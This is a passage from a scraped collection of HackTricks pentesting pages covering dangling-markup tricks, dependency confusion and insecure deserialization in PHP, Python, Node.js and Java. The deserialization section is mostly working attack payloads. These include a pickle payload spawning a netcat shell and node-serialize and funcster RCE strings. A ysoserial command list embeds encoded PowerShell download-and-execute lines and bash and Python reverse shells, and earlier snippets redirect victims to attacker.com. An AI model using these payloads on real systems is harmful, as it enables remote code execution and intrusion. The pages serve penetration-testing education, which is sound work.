‚Üê Condition always evaluates to true\n...\n}\nAbuse of JSONP\nIf you find a JSONP interface you could be able to call an arbitrary function with arbitrary data:\n<\nscript\nsrc\n=\n'\n/editor/sharing.js\n'\n>\n:              ‚Üê Legitimate script\nfunction set_sharing(public) {\nif (public) request.access_mode = AM_PUBLIC;\nelse request.access_mode = AM_PRIVATE;\n...\n}\n‚Äã\n<\nscript\nsrc\n=\n'\n/search?q=a&call=set_sharing\n'\n>\n:    ‚Üê Injected JSONP call\nset_sharing({ ... })\nOr you can even try to execute some javascript:\n<\nscript\nsrc\n=\n'\n/search?q=a&call=alert(1)\n'\n>\n</\nscript\n>\nIframe abuse\nNotice that a\nchild document can view and set location property for parent, even if cross-origin.\nThis means that you can make the client access any other page by loading inside an\niframe\nsome code like:\n<\nhtml\n>\n<\nhead\n>\n</\nhead\n>\n<\nbody\n>\n<\nscript\n>\ntop\n.\nwindow\n.\nlocation\n=\n\"https://attacker.com/hacked.html\"\n</\nscript\n>\n</\nbody\n>\n</\nhtml\n>\nThis can be mitigated with something like:\nsandbox=‚Äô allow-scripts allow-top-navigation‚Äô\nAn iframe can also be abused to leak sensitive information from a different page\nusing the iframe name attribute\n. This is because you can create an iframe that iframes itself abusing the HTML injection that makes the\nsensitive info appear inside the iframe name attribute\nand then access that name from the initial iframe and leak it.\n<\nscript\n>\nfunction\ncspBypass\n(\nwin\n)\n{\nwin\n[\n0\n].\nlocation\n=\n'about:blank'\n;\nsetTimeout\n(()\n=>\nalert\n(\nwin\n[\n0\n].\nname\n),\n500\n);\n}\n</\nscript\n>\n‚Äã\n<\niframe\nsrc\n=\n\"\n//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27\n\"\nonload\n=\n\"\ncspBypass\n(\nthis\n.\ncontentWindow\n)\n\"\n>\n</\niframe\n>\nFor more info check\nhttps://portswigger.net/research/bypassing-csp-with-dangling-iframes\n‚Äã\n<meta abuse\nYou could use\nmeta http-equiv\nto perform\nseveral actions\nlike setting a Cookie:\n<meta http-equiv=\"Set-Cookie\" Content=\"SESSID=1\">\nor performing a redirect (in 5s in this case):\n<meta name=\"language\" content=\"5;http://attacker.svg\" HTTP-EQUIV=\"refresh\" />\nThis can be\navoided\nwith a\nCSP\nregarding\nhttp-equiv\n(\nContent-Security-Policy: default-src 'self';\n, or\nContent-Security-Policy: http-equiv 'self';\n)\nNew <portal HTML tag\nYou can find a very\ninteresting research\non exploitable vulnerabilities of the <portal tag\nhere\n.\nAt the moment of this writing you need to enable the portal tag on Chrome in\nchrome://flags/#enable-portals\nor it won't work.\n<portal src='https://attacker-server?\nHTML Leaks\nNot all the ways to leak connectivity in HTML will be useful for Dangling Markup, but sometimes it could help. Check them here:\nhttps://github.com/cure53/HTTPLeaks/blob/master/leak.html\n‚Äã\nSS-Leaks\nThis is a\nmix\nbetween\ndangling markup and XS-Leaks\n. From one side the vulnerability allows to\ninject HTML\n(but not JS) in a page of the\nsame origin\nof the one we will be attacking. On the other side we won't\nattack\ndirectly the page where we can inject HTML, but\nanother page\n.\nSS-Leaks\nXS-Search/XS-Leaks\nXS-Search are oriented to\nexfiltrate cross-origin information\nabusing\nside channel attacks\n.Therefore, it's a different technique than Dangling Markup, however, some of the techniques abuse the inclusion of HTML tags (with and without JS execution), like\nCSS Injection\nor\nLazy Load Images\n.\nXS-Search/XS-Leaks\nBrute-Force Detection List\nAuto_Wordlists/dangling_markup.txt at main ¬∑ carlospolop/Auto_Wordlists\nGitHub\nReferences\nAll the techniques presented here and more can view reviewed with more details in:\nPostcards from the post-XSS world\nAnother HTML tags that can be abused can be find here:\nHTML scriptless attacks\nThe Spanner\nMore info:\nEvading CSP with DOM-based dangling markup\nPortSwigger Research\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPentesting Web -\nPrevious\nCSRF (Cross Site Request Forgery)\nNext\nSS-Leaks\nLast modified\n3mo ago"
    },
    {
        "title": "Dependency Confusion",
        "url": "https://book.hacktricks.xyz/pentesting-web/dependency-confusion",
        "text": "Dependency Confusion\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBasic Information\nIn summary, a dependency confusion vulnerability occurs when a project is using a library with a\nmisspelled\nname,\ninexistent\nor with an\nunspecified version\nand the used dependency repository allows to\ngather updated versions from public\nrepositories.\nMisspelled\n: Import\nreqests\ninstead of\nrequests\nInexistent\n: Import\ncompany-logging\n, an internal library which\nno longer exists\nUnspecified version\n: Import an\ninternal\nexistent\ncompany-requests\nlibrary , but the repo check\npublic repos\nto see if there are\ngreater versions\n.\nExploitation\nIn all cases the attacker just need to publish a\nmalicious package with name\nof libraries used by the victim company.\nMisspelled & Inexistent\nIf your company is trying to\nimport a library that isn't internal\n, highly probably the repo of libraries is going to be searching for it in\npublic repositories\n. If an attacker has created it, your code and machines running is highly probably going to be compromised.\nUnspecified Version\nIt's very common for developers to\nnot specify any version\nof the library used, or specify just a\nmayor version\n. Then, the interpreter will try to download the\nlatest version\nfitting those requirements.\nIf the library is a\nknown external library\n(like python\nrequests\n), an\nattacker cannot do much\n, as he won't be able to create a library called\nrequests\n(unless he is the original author).\nHowever, if the library is\ninternal\n, like\nrequests-company\nin this example, if the\nlibrary repo\nallows to\ncheck for new versions also externally\n, it will search for a newer version publicly available.\nSo if an\nattacker knows\nthat the company is using the\nrequests-company\nlibrary\nversion 1.0.1\n(allow minor updates). He can\npublish\nthe library\nrequests-company\nversion 1.0.2\nand the company will\nuse that library instead\nof the internal one.\nAWS Fix\nThis vulnerability was found in AWS\nCodeArtifact\n(read the\ndetails in this blog post\n).\nAWS fixed this by allowing to specify if a library is internal or external, to avoid downloading internal dependencied from external repositories.\nFinding Vulnerable Libraries\nIn the\noriginal post about dependency confusion\nthe author searched for thousands of exposed package.json files containing javascript project‚Äôs dependencies.\nReferences\n‚Äã\nhttps://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610\n‚Äã\n‚Äã\nhttps://zego.engineering/dependency-confusion-in-aws-codeartifact-86b9ff68963d\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPrevious\nSS-Leaks\nNext\n- Pentesting Web\nDeserialization\nLast modified\n6mo ago"
    },
    {
        "title": "Deserialization",
        "url": "https://book.hacktricks.xyz/pentesting-web/deserialization",
        "text": "Deserialization\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nSerialization\nis the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications.\nDeserialization\nis the reverse of that process, taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.\nIn many occasions you can find some code in the server side that unserialize some object given by the user.\nIn this case, you can send a malicious payload to make the server side behave unexpectedly.\nYou should read:\nhttps://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html\nfor learn how to attack.\nPHP\nMagic method used with serialization:\n__sleep\nis called when an object is serialized and must be returned to array\nMagic method used with deserialization\n__wakeup\nis called when an object is deserialized.\n__unserialize\nis called instead of\n__wakeup\nif it exists.\n__destruct\nis called when PHP script end and object is destroyed.\n__toString\nuses object as string but also can be used to read file or more than that based on function call inside it.\n<?php\nclass\ntest\n{\npublic\n$s\n=\n\"This is a test\"\n;\npublic\nfunction\ndisplaystring\n(){\necho\n$this\n->\ns\n.\n'<br />'\n;\n}\npublic\nfunction\n__toString\n()\n{\necho\n'__toString method called'\n;\n}\npublic\nfunction\n__construct\n(){\necho\n\"__construct method called\"\n;\n}\npublic\nfunction\n__destruct\n(){\necho\n\"__destruct method called\"\n;\n}\npublic\nfunction\n__wakeup\n(){\necho\n\"__wakeup method called\"\n;\n}\npublic\nfunction\n__sleep\n(){\necho\n\"__sleep method called\"\n;\nreturn\narray\n(\n\"s\"\n);\n#The \"s\" makes references to the public attribute\n}\n}\n‚Äã\n$o\n=\nnew\ntest\n();\n$o\n->\ndisplaystring\n();\n$ser\n=\nserialize\n(\n$o\n);\necho\n$ser\n;\n$unser\n=\nunserialize\n(\n$ser\n);\n$unser\n->\ndisplaystring\n();\n‚Äã\n/*\nphp > $o = new test();\n__construct method called\n__destruct method called\nphp > $o->displaystring();\nThis is a test<br />\n‚Äã\nphp > $ser=serialize($o);\n__sleep method called\n‚Äã\nphp > echo $ser;\nO:4:\"test\":1:{s:1:\"s\";s:14:\"This is a test\";}\n‚Äã\nphp > $unser=unserialize($ser);\n__wakeup method called\n__destruct method called\n‚Äã\nphp > $unser->displaystring();\nThis is a test<br />\n*/\n?>\nIf you look to the results you can see that the functions\n__wakeup\nand\n__destruct\nare called when the object is deserialized. Note that in several tutorials you will find that the\n__toString\nfunction is called when trying yo print some attribute, but apparently that's\nnot happening anymore\n.\nThe method``\n__unserialize(array $data)\nis called\ninstead of\n__wakeup()\nif it is implemented in the class. It allows you to unserialize the object by providing the serialized data as an array. You can use this method to unserialize properties and perform any necessary tasks upon deserialization.\nphpCopy codeclass MyClass\n{\nprivate\n$property\n;\n‚Äã\npublic\nfunction\n__unserialize\n(\narray\n$data\n):\nvoid\n{\n$this\n->\nproperty\n=\n$data\n[\n'property'\n];\n// Perform any necessary tasks upon deserialization.\n}\n}\nYou can read an explained\nPHP example here\n:\nhttps://www.notsosecure.com/remote-code-execution-via-php-unserialize/\n, here\nhttps://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf\nor here\nhttps://securitycafe.ro/2015/01/05/understanding-php-object-injection/\n‚Äã\nPHP Deserial + Autoload Classes\nYou could abuse the PHP autoload functionality to load arbitrary php files and more:\nPHP - Deserialization + Autoload Classes\nSerializing Referenced Values\nIf for some reason you want to serialize a value as a\nreference to another value serialized\nyou can:\n<?php\nclass\nAClass\n{\npublic\n$param1\n;\npublic\n$param2\n;\n}\n‚Äã\n$o\n=\nnew\nWeirdGreeting\n;\n$o\n->\nparam1\n=&\n$o\n->\nparam22\n;\n$o\n->\nparam\n=\n\"PARAM\"\n;\n$ser\n=\nserialize\n(\n$o\n);\nPHPGGC (ysoserial for PHP)\n‚Äã\nPHPGCC\ncan help you generating payloads to abuse PHP deserializations.\nNote than in several cases you\nwon't be able to find a way to abuse a deserialization in the source code\nof the application but you may be able to\nabuse the code of external PHP extensions.\nSo, if you can, check the\nphpinfo()\nof the server and\nsearch on the internet\n(an even on the\ngadgets\nof\nPHPGCC\n) some possible gadget you could abuse.\nphar:// metadata deserialization\nIf you have found a LFI that is just reading the file and not executing the php code inside of it, for example using functions like\nfile_get_contents(), fopen(), file() or file_exists(), md5_file(), filemtime() or filesize()\n.\nYou can try to abuse a\ndeserialization\noccurring when\nreading\na\nfile\nusing the\nphar\nprotocol.\nFor more information read the following post:\nphar:// deserialization\nPython\nPickle\nWhen the object gets unpickle, the function\n__reduce__\nwill be executed.\nWhen exploited, server could return an error.\nimport\npickle\n,\nos\n,\nbase64\nclass\nP\n(\nobject\n):\ndef\n__reduce__\n(\nself\n):\nreturn\n(\nos\n.\nsystem\n,(\n\"netcat -c '/bin/bash -i' -l -p 1234 \"\n,))\nprint\n(\nbase64\n.\nb64encode\n(\npickle\n.\ndumps\n(\nP\n())))\nFor more information about escaping from\npickle jails\ncheck:\nBypass Python sandboxes\nYaml\n&\njsonpickle\nThe following page present the technique to\nabuse an unsafe deserialization in yamls\npython libraries and finishes with a tool that can be used to generate RCE deserialization payload for\nPickle, PyYAML, jsonpickle and ruamel.yaml\n:\nPython Yaml Deserialization\nClass Pollution (Python Prototype Pollution)\nClass Pollution (Python's Prototype Pollution)\nNodeJS\nJS Magic Functions\nJS\ndoesn't have \"magic\" functions\nlike PHP or Python that are going to be executed just for creating an object. But it has some\nfunctions\nthat are\nfrequently used even without directly calling them\nsuch as\ntoString\n,\nvalueOf\n,\ntoJSON\n.\nIf abusing a deserialization you can\ncompromise these functions to execute other code\n(potentially abusing prototype pollutions) you could execute arbitrary code when they are called.\nAnother\n\"magic\" way to call a function\nwithout calling it directly is by\ncompromising an object that is returned by an async function\n(promise). Because, if you\ntransform\nthat\nreturn object\nin another\npromise\nwith a\nproperty\ncalled\n\"then\" of type function\n, it will be\nexecuted\njust because it's returned by another promise.\nFollow\nthis link\nfor more info.\n// If you can compromise p (returned object) to be a promise\n// it will be executed just because it's the return object of an async function:\nasync\nfunction\ntest_resolve\n()\n{\nconst\np\n=\nnew\nPromise\n(\nresolve\n=>\n{\nconsole\n.\nlog\n(\n'hello'\n)\nresolve\n()\n})\nreturn\np\n}\n‚Äã\nasync\nfunction\ntest_then\n()\n{\nconst\np\n=\nnew\nPromise\n(\nthen\n=>\n{\nconsole\n.\nlog\n(\n'hello'\n)\nreturn\n1\n})\nreturn\np\n}\n‚Äã\ntest_ressolve\n()\ntest_then\n()\n//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/\n__proto__\nand\nprototype\npollution\nIf you want to learn about this technique\ntake a look to the following tutorial\n:\nNodeJS - __proto__ & prototype Pollution\n‚Äã\nnode-serialize\n‚Äã\nThis library allows to serialise functions. Example:\nvar\ny\n=\n{\n\"rce\"\n:\nfunction\n(){\nrequire\n(\n'child_process'\n).\nexec\n(\n'ls /'\n,\nfunction\n(\nerror\n,\nstdout\n,\nstderr\n)\n{\nconsole\n.\nlog\n(\nstdout\n)\n})},\n}\nvar\nserialize\n=\nrequire\n(\n'node-serialize'\n);\nvar\npayload_serialized\n=\nserialize\n.\nserialize\n(\ny\n);\nconsole\n.\nlog\n(\n\"Serialized: \\n\"\n+\npayload_serialized\n);\nThe\nserialised object\nwill looks like:\n{\n\"rce\"\n:\n\"_\n$$\nND_FUNC\n$$\n_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}\"\n}\nYou can see in the example that when a function is serialized the\n_$$ND_FUNC$$_\nflag is appended to the serialized object.\nInside the file\nnode-serialize/lib/serialize.js\nyou can find the same flag and how the code is using it.\nAs you may see in the last chunk of code,\nif the flag is found\neval\nis used to deserialize the function, so basically\nuser input if being used inside the\neval\nfunction\n.\nHowever,\njust serialising\na function\nwon't execute it\nas it would be necessary that some part of the code is\ncalling\ny.rce\nin our example and that's highly\nunlikable\n.\nAnyway, you could just\nmodify the serialised object\nadding some parenthesis\nin order to auto execute the serialized function when the object is deserialized.\nIn the next chunk of code\nnotice the last parenthesis\nand how the\nunserialize\nfunction will automatically execute the code:\nvar\nserialize\n=\nrequire\n(\n'node-serialize'\n);\nvar\ntest\n=\n{\n\"rce\"\n:\n\"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()\"\n};\nserialize\n.\nunserialize\n(\ntest\n);\nAs it was previously indicated, this library will get the code after\n_$$ND_FUNC$$_\nand will\nexecute it\nusing\neval\n. Therefore, in order to\nauto-execute code\nyou can\ndelete the function creation\npart and the last parenthesis and\njust execute a JS oneliner\nlike in the following example:\nvar\nserialize\n=\nrequire\n(\n'node-serialize'\n);\nvar\ntest\n=\n'{\"rce\":\"_$$ND_FUNC$$_require(\\'child_process\\').exec(\\'ls /\\', function(error, stdout, stderr) { console.log(stdout) })\"}'\n;\nserialize\n.\nunserialize\n(\ntest\n);\nYou can\nfind here\nfurther information\nabout how to exploit this vulnerability.\n‚Äã\nfuncster\n‚Äã\nThe interesting difference here is that the\nstandard built-in objects are not accessible\n, because they are out of scope. It means that we can execute our code, but cannot call build-in objects‚Äô methods. So if we use\nconsole.log()\nor\nrequire(something)\n, Node returns an exception like\n\"ReferenceError: console is not defined\"\n.\nHowever, we can easily can get back access to everything because we still have access to the global context using something like\nthis.constructor.constructor(\"console.log(1111)\")();\n:\nfuncster\n=\nrequire\n(\n\"funcster\"\n);\n//Serialization\nvar\ntest\n=\nfuncster\n.\nserialize\n(\nfunction\n()\n{\nreturn\n\"Hello world!\"\n})\nconsole\n.\nlog\n(\ntest\n)\n// { __js_function: 'function(){return\"Hello world!\"}' }\n‚Äã\n//Deserialization with auto-execution\nvar\ndesertest1\n=\n{\n__js_function\n:\n'function(){return \"Hello world!\"}()'\n}\nfuncster\n.\ndeepDeserialize\n(\ndesertest1\n)\nvar\ndesertest2\n=\n{\n__js_function\n:\n'this.constructor.constructor(\"console.log(1111)\")()'\n}\nfuncster\n.\ndeepDeserialize\n(\ndesertest2\n)\nvar\ndesertest3\n=\n{\n__js_function\n:\n'this.constructor.constructor(\"require(\\'child_process\\').exec(\\'ls /\\', function(error, stdout, stderr) { console.log(stdout) });\")()'\n}\nfuncster\n.\ndeepDeserialize\n(\ndesertest3\n)\nFor\nmore information read this page\n.\n‚Äã\nserialize-javascript\n‚Äã\nThe package\ndoesn‚Äôt include any deserialization functionalit\ny and requires you to implement it yourself. Their example uses\neval\ndirectly. This is the official deserialisation example:\nfunction\ndeserialize\n(\nserializedJavascript\n){\nreturn\neval\n(\n'('\n+\nserializedJavascript\n+\n')'\n);\n}\nIf this function is used to deserialize objects you can\neasily exploit it\n:\nvar\nserialize\n=\nrequire\n(\n'serialize-javascript'\n);\n//Serialization\nvar\ntest\n=\nserialize\n(\nfunction\n()\n{\nreturn\n\"Hello world!\"\n});\nconsole\n.\nlog\n(\ntest\n)\n//function() { return \"Hello world!\" }\n‚Äã\n//Deserialization\nvar\ntest\n=\n\"function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()\"\ndeserialize\n(\ntest\n)\nCryo library\nIn the following pages you can find information about how to abuse this library to execute arbitrary commands:\n‚Äã\nhttps://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/\n‚Äã\n‚Äã\nhttps://hackerone.com/reports/350418\n‚Äã\nJava - HTTP\nThe main problem with deserialized objects in Java is that\ndeserialization callbacks were invoked during deserialization\n. This makes possible for an\nattacker\nto\ntake advantage of that callbacks\nand prepare a payload that abuses the callbacks to\nperform malicious actions\n.\nFingerprints\nWhite Box\nSearch inside the code for serialization classes and function. For example, search for classes implementing\nSerializable\n, the use of\njava.io.ObjectInputStream\n__ or\nreadObject\n__ or\nreadUnshare\nfunctions_._\nYou should also keep an eye on:\nXMLdecoder\nwith external user defined parameters\nXStream\nwith\nfromXML\nmethod (xstream version <= v1.46 is vulnerable to the serialization issue)\nObjectInputStream\nwith\nreadObject\nUses of\nreadObject\n,\nreadObjectNodData\n,\nreadResolve\nor\nreadExternal\nObjectInputStream.readUnshared\nSerializable\nBlack Box\nFingerprints/Magic Bytes\nof\njava serialised\nobjects (from\nObjectInputStream\n):\nAC ED 00 05\nin Hex\nrO0\nin Base64\nContent-type\nheader of an HTTP response set to\napplication/x-java-serialized-object\n1F 8B 08 00\nHex previously compressed\nH4sIA\nBase64 previously compressed\nWeb files with extension\n.faces\nand\nfaces.ViewState\nparameter. If you find this in a wabapp, take a look to the\npost about Java JSF VewState Deserialization\n.\njavax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s\nCheck if vulnerable\nIf you want to\nlearn about how does a Java Deserialized exploit work\nyou should take a look to\nBasic Java Deserialization\n,\nJava DNS Deserialization\n, and\nCommonsCollection1 Payload\n.\nWhite Box Test\nYou can check if there is installed any application with known vulnerabilities.\nfind\n.\n-iname\n\"*commons*collection*\"\ngrep\n-R\nInvokeTransformer\n.\nYou could try to\ncheck all the libraries\nknown to be vulnerable and that\nYsoserial\ncan provide an exploit for. Or you could check the libraries indicated on\nJava-Deserialization-Cheat-Sheet\n.\nYou could also use\ngadgetinspector\nto search for possible gadget chains that can be exploited.\nWhen running\ngadgetinspector\n(after building it) don't care about the tons of warnings/errors that it's going through and let it finish. It will write all the findings under\ngadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt\n. Please, notice that\ngadgetinspector won't create an exploit and it may indicate false positives\n.\nBlack Box Test\nUsing the Burp extension\ngadgetprobe\nyou can identify\nwhich libraries are available\n(and even the versions). With this information it could be\neasier to choose a payload\nto exploit the vulnerability.\nRead this to learn more about GadgetProbe\n.\nGadgetProbe is focused on **\nObjectInputStream\n** deserializations**.**\nUsing Burp extension\nJava Deserialization Scanner\nyou can\nidentify vulnerable libraries\nexploitable with ysoserial and\nexploit\nthem.\nRead this to learn more about Java Deserialization Scanner.\nJava Deserialization Scanner is focused on\nObjectInputStream\ndeserializations.\nYou can also use\nFreddy\nto\ndetect deserializations\nvulnerabilities in\nBurp\n. This plugin will detect **not only\nObjectInputStream\n**related vulnerabilities but\nalso\nvulns from\nJson\nan\nYml\ndeserialization libraries. In active mode, it will try to confirm them using sleep or DNS payloads.\nYou can find more information about Freddy here.\n‚Äã\nSerialization Test\nNot all is about checking if any vulnerable library is used by the server. Sometimes you could be able to\nchange the data inside the serialized object and bypass some checks\n(maybe grant you admin privileges inside a webapp).\nIf you find a java serialized object being sent to a web application,\nyou can use\nSerializationDumper\nto print in a more human readable format the serialization object that is sent\n. Knowing which data are you sending would be easier to modify it and bypass some checks.\nExploit\nysoserial\nThe most well-known tool to exploit Java deserializations is\nysoserial\n(\ndownload here\n). You can also consider using\nysoseral-modified\nwhich will allow you to use complex commands (with pipes for example).\nNote that this tool is\nfocused\non exploiting\nObjectInputStream\n.\nI would\nstart using the \"URLDNS\"\npayload\nbefore a RCE\npayload to test if the injection is possible. Anyway, note that maybe the \"URLDNS\" payload is not working but other RCE payload is.\n# PoC to make the application perform a DNS req\njava\n-jar\nysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net\n>\npayload\n‚Äã\n# PoC RCE in Windows\n# Ping\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections5\n'cmd /c ping -n 5 127.0.0.1'\n>\npayload\n# Time, I noticed the response too longer when this was used\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"cmd /c timeout 5\"\n>\npayload\n# Create File\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"cmd /c echo pwned> C:\n\\\\\\\\\nUsers\n\\\\\\\\\nusername\n\\\\\\\\\npwn\"\n>\npayload\n# DNS request\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net\"\n# HTTP request (+DNS)\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a\"\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA\"\n## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')\n## To encode something in Base64 for Windows PS from linux you can use: echo -n \"<PAYLOAD>\" | iconv --to-code UTF-16LE | base64 -w0\n# Reverse Shell\n## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA\"\n‚Äã\n#PoC RCE in Linux\n# Ping\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"ping -c 5 192.168.1.4\"\n>\npayload\n# Time\n## Using time in bash I didn't notice any difference in the timing of the response\n# Create file\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"touch /tmp/pwn\"\n>\npayload\n# DNS request\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net\"\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net\"\n# HTTP request (+DNS)\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net\"\n>\npayload\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net\"\n# Reverse shell\n## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}\"\n|\nbase64\n-w0\n## Encoded: export RHOST=\"127.0.0.1\";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'\njava\n-jar\nysoserial-master-SNAPSHOT.jar CommonsCollections4\n\"bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}\"\n‚Äã\n# Base64 encode payload in base64\nbase64\n-w0\npayload\nWhen creating a payload for\njava.lang.Runtime.exec()\nyou\ncannot use special characters\nlike \">\" or \"|\" to redirect the output of an execution, \"$()\" to execute commands or even\npass arguments\nto a command separated by\nspaces\n(you can do\necho -n \"hello world\"\nbut you can't do\npython2 -c 'print \"Hello world\"'\n). In order to encode correctly the 